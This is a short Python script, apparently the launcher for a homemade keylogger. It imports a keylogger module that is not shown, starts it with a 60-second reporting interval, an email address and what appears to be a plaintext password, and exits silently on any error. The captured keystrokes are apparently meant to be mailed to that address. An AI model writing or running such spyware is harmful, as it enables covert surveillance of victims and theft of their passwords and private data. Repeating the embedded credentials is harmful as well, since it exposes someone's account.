#!/usr/bin/env python

import keylogger
import sys

try:
    my_keylogger = keylogger.Keylogger(60, "WhiteDEVil1602@gmial.com", "Yuvraj@White")
    my_keylogger.start()

except Exception:
    sys.exit()
